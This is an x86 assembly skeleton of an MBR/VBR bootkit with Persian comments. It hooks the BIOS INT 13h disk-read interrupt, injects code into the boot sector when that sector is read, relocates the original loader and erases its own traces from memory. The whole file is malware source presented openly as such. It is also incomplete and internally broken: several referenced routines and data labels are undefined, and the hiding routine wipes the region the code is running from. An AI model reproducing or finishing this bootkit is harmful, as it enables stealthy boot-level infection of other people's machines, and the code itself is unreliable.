; بوت‌کیت MBR/VBR
section .text
org 0x7C00

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    ; پنهان‌سازی خود
    call hide_bootkit

    ; جایگزینی بوت‌لودر اصلی
    mov si, original_boot_loader
    mov di, 0x7E00
    mov cx, 512
    rep movsb

    ; نصب هوک خواندن دیسک
    mov word [0x4C], disk_read_hook
    mov word [0x4E], 0

    ; پرش به بوت‌لودر اصلی
    jmp 0:0x7E00

disk_read_hook:
    ; بررسی سکتورهای حیاتی
    cmp dh, 0
    jne .original
    cmp cx, 1
    jne .original

    ; تزریق به سکتور بوت
    call inject_to_boot_sector
    jmp .done

.original:
    ; فراخوانی اصلی
    pushf
    call far [cs:original_disk_handler]
.done:
    iret

hide_bootkit:
    ; پاک‌کردن ردپا از MBR
    mov di, 0x7C00
    mov cx, 512
    xor al, al
    rep stosb
    ret

    